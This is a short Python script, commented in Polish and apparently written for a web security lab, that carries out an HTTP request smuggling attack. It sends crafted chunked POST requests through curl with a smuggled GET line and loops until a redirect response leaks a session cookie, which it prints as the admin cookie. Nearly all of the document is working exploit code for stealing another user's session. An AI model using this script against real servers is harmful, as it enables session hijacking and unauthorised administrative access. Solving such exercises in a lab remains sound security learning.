import requests
import re
import sys
import os
import subprocess

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    host_header = burp_url[8:]

    session = requests.Session()
    admin_cookie = None
    counter = 0

    while True:
        # Wybierz odpowiedni endpoint w zależności od liczby zapytań
        if counter < 30:
            endpoint = "/x"
        else:
            endpoint = "/"

        # Wykonaj polecenie curl i przechwyć jego wyjście
        result = subprocess.run(
            [
                "curl", "--path-as-is", "-i", "-k", "-X", "POST",
                "-H", f"Host: {host_header}",
                "-H", "Transfer-Encoding: chunked",
                "--data-binary", f"0\x0d\x0a\x0d\x0aGET {endpoint} HTTP/1.1\x0d\x0aHost: {burp_url}\x0d\x0a\x0d\x0a",
                f"{burp_url}{endpoint}"
            ],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        # Sprawdź, czy wynik zawiera HTTP/2 302
        if "HTTP/2 302" in result.stdout:
            # Wyciągnij ciasteczko z odpowiedzi
            match = re.search(r'Set-Cookie: ([^;]+);', result.stdout)
            if match:
                admin_cookie = match.group(1)
            break

        # Zwiększ licznik i przestaw na kolejny zestaw zapytań
        counter += 1
        if counter == 45:  # 30 zapytań do /x i 15 zapytań do /
            counter = 0

    if admin_cookie:
        print(f"Admin cookie: {admin_cookie}")
    else:
        print("Nie znaleziono ciasteczka.")
